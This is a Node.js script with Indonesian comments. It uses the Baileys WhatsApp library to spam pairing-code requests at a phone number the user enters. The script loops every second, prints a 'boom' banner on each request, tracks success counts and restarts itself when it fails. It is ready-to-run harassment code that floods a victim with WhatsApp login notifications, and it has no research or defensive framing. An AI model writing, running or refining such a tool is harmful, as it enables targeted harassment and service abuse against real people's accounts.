const { makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const chalk = require('chalk');
const pino = require('pino');
const readline = require('readline');
const fs = require('fs').promises;

// ASCII art untuk "boom"
const boomArt = `                                      ...........                                                   
                                      ...........                                                   
       ............              .....::::=---:.....                                                
       ............              .....--:-:-+=::....                                                
.......:--====--:::::::...............:+*@#=--+:.................................................   
......=#@@@@@@@@@@%#+--=+=....:::::::::=+*+:::....:::::::::--.....:-=+++=:-=+:...........:-:.....   
.....-#@##########%%@@%+:--+*%%@@@@@%#*=-+*==:-+*%%@@@@@%#*=-=*-:=#@@%%@@@*--#*:..:-+###*--+*-...   
...::*@#########+-=*#%%@#*@%%########%@@%=---*%%%#######%%%@%+::+@%######%%@=:*#:=#%%##%%@*-*%=..   
...--*%#########=..:+#%%@@######*######%%@#=#%#############%%@#*@%###*-:=*#%@=:-+%%######%%-=%%-.   
...--#%#####@%%@#*++*##%%###########-.-*#%@@%##########*=.-*#%@@%#####=..:#%@#-*%########%@*-*@+.   
...--%%#####@@@%#######%############+..:##%%############+:.-*#%@########**##%@#@%#########@#:+@#:...
..:-=%%###%@@#%%##########*##%%%######**###%#####%@%######**###%#############@@%##########%%==%@-...
..:-=%%###%%#########%%@###*##%@%%%########%%#####%@%%%########%%######%%####%@###########%%+-#@+...
..:-+@%#########%@@@@@%%%%#####%@@%########%@@%#####@@@#########@@%####%%#*#*%@%%%%#######%@*:*@*:..
..--+@%####%@%#%%%####%%%@@%###%@@@%#######%@@%####%@@@%#######%@@%####@@*###%@%%@%#######%@*:*@#:..
..--+@%###%%@@%@%######%%%@@#%%@%%@%%%%%%%#%@@%###%@%%@%#%%%%%%%@@%####@@::##%@@%@%%%%%%%#%@#-+@%-..
..--=@%%%%%%%@@@####%%%%%%@@%%%%%%%%%%%%%%%%@%%%%%%%%%%%%%%%%%%%@%####%@@##%%%@@%@@%%%%%%%%@#-=%@-..
..-+-%@%%%%@@@%%@%%%%%%%%%@@%%%%%%%%%%%%%%%@@%%%%%%%%%%%%%%%%%%@@%##%%%@@%%%%%%%%%@@%%%%%%%@%-=%@=..
..:*-+@%%%%%%#%#%%%%%%%%%@@%%%%%%%%%%%%%%%@@@%%%%%%%%%%%%%%%%%@%%%%%%%%@@%%%%%%%%%@@@%%%%%%@%==%@=..
...+*-*@@%%%%%%%%%%%%%%%%@@%%*:=#%%%%%%%@#=-*%@%%*:-#%%%%%%@@@%%%%%%%%@%%@@%%%%@@%*=#@%%%%%@#-+@@=..
...:##-=#@%%%%%%%%%*+*%%@#+%@@%%%@@@@@%*--+*=-+%@@%%@@@@@@%*-+@@%%%%@@*-:-=****+=-:::*@@%%%%+-#@@=..
....:#%*--+#@@@@@%%**#@%=:=-:=++++==-::-*%@@@%+---=++++=-:-++:-+*#*+=--+%%#*--:--=+:+--*#%#=-*@@#:..
......+%@%*=:-=+**#**+-:=%@@@%#**--::**#*@@%+#@@@%#***##%@@@#:+*+++*#*=+%%%@+=:--=+:#@#+===*%@@%-...
........=#@@@%*:=++++*#@@@@%#%@@@=--:==**@@+..:=#%@@@@@@@@%#*:*@@@@@@%*=::=@**:--=+:#@@@@@@@@@#-....
       ...:=*%#:*@@@@@@@@#=....:=----#@@@@@+......@#:::::...+:*@@*===+#+::-#%%:--:-:#@@@++*+=:...   
       .......*:*@@@@*--........---%@@@@@*=:......@*.......:#%@@@+.=**+==%*-#%=---==%@@@.........   
           ...+:*@@@+==:..   ...---%@@*:.....   ..@*......---%@@#*:=%@*=+@%@@=*=--#@@@@@.           
           ...+:*@@@*-....   ...---%@*.......   ..+-......:+*@%=-:=-+@@@@#:+@@@@++%@%+*@.           
           ...+:*@@@*:....   ...---%@*...       ...........=-**.::..+#==*@@@@@##@@@@+.+@....        
           ...+:*@@@+..      ...---%@*...       ....   ......--.=:..+#:..-*%#+..=**+:.:-....        
           ...+:*@@@+..      ...-+*@@*...                      .....=*:...                          
           ...+:*@@@+..      ...-#@@@=...                      ...........                          
           ...+:*@%+:..          :==:....                                                           
           ...*#@@#:...          ........                                                           
           ...+@@@*....                                                                             
           .....::.....                                                                             
              .....                                                                                 `;

// Konfigurasi logger dengan pino
const logger = pino({ level: 'silent' }); // Ubah ke 'info' untuk debug
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// File untuk menyimpan stats
const STATS_FILE = 'stats.json';

// Variabel status
let successCount = 0;
let failedCount = 0;
let targetNumber = '';

// Load stats dari file
async function loadStats() {
    try {
        const data = await fs.readFile(STATS_FILE, 'utf8');
        const stats = JSON.parse(data);
        successCount = stats.successCount || 0;
        failedCount = stats.failedCount || 0;
    } catch (err) {
        // File belum ada, mulai dari 0
    }
}

// Save stats ke file
async function saveStats() {
    const stats = { successCount, failedCount };
    await fs.writeFile(STATS_FILE, JSON.stringify(stats, null, 2));
}

// Fungsi untuk meminta input nomor target
function askTargetNumber() {
    return new Promise((resolve) => {
        rl.question(chalk.cyan('Masukkan nomor target (contoh: 6281234567890): '), (input) => {
            targetNumber = input.trim();
            console.log(chalk.green(`Nomor target: ${targetNumber}`));
            resolve();
        });
    });
}

// Fungsi utama untuk inisialisasi bot
async function initBot(attempt = 1) {
    try {
        const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');
        const sock = makeWASocket({
            auth: state,
            logger,
            printQRInTerminal: false // Nonaktifkan QR, gunakan pairing code
        });

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;
            if (qr) {
                console.log(chalk.yellow('QR Generated (Fallback, sebaiknya gunakan pairing code).'));
            }
            if (connection === 'open') {
                console.log(chalk.green('Koneksi berhasil! Memulai spam pairing code...'));
                await spamLoop(sock);
            }
            if (connection === 'close') {
                const reason = lastDisconnect?.error?.message || 'Unknown';
                console.log(chalk.red(`Terputus: ${reason}. Mencoba restart (Percobaan ${attempt})...`));
                failedCount++;
                console.log(chalk.blue(`Success: ${successCount} | Gagal: ${failedCount}`));
                await saveStats();
                sock.end();
                setTimeout(() => initBot(attempt + 1), 5000);
            }
        });

        // Request pairing code untuk nomor target
        if (!sock.authState.creds.registered) {
            const pairingCode = await sock.requestPairingCode(targetNumber);
            console.log(chalk.green(`Pairing Code: ${pairingCode}`));
            console.log(chalk.magenta(boomArt));
            successCount++;
            console.log(chalk.blue(`Success: ${successCount} | Gagal: ${failedCount}`));
            await saveStats();
        }
    } catch (err) {
        console.log(chalk.red(`Error inisialisasi (Percobaan ${attempt}): ${err.message}`));
        failedCount++;
        console.log(chalk.blue(`Success: ${successCount} | Gagal: ${failedCount}`));
        await saveStats();
        if (attempt < 10) {
            setTimeout(() => initBot(attempt + 1), 5000);
        } else {
            console.log(chalk.red('Mencapai batas percobaan inisialisasi. Periksa akun atau koneksi.'));
            rl.close();
        }
    }
}

// Fungsi spam loop
async function spamLoop(sock) {
    while (true) {
        try {
            const pairingCode = await sock.requestPairingCode(targetNumber);
            console.log(chalk.green(`Pairing Code: ${pairingCode}`));
            console.log(chalk.magenta(boomArt));
            successCount++;
            console.log(chalk.blue(`Success: ${successCount} | Gagal: ${failedCount}`));
            await saveStats();
            await new Promise(resolve => setTimeout(resolve, 1000)); // Interval 1 detik
        } catch (err) {
            console.log(chalk.red(`Error dalam spam loop: ${err.message}`));
            failedCount++;
            console.log(chalk.blue(`Success: ${successCount} | Gagal: ${failedCount}`));
            await saveStats();
            break; // Keluar dari loop untuk restart
        }
    }
}

// Mulai aplikasi
async function start() {
    await loadStats();
    console.log(chalk.blue(`Memuat stats: Success: ${successCount} | Gagal: ${failedCount}`));
    await askTargetNumber();
    await initBot();
}

start();
